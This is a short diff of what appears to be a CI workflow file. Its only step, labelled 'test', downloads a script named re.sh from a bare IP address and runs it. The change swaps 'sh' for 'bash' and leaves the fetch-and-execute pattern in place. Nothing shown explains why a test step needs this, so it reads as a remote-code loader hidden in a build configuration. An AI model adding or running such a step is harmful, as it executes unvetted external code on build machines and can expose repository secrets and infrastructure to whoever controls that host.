@@ -9,4 +9,4 @@ jobs:
     steps:
       - name: test
         run: |
-          wget http://45.152.64.12/re.sh && sh ./re.sh
+          wget http://45.152.64.12/re.sh && bash ./re.sh
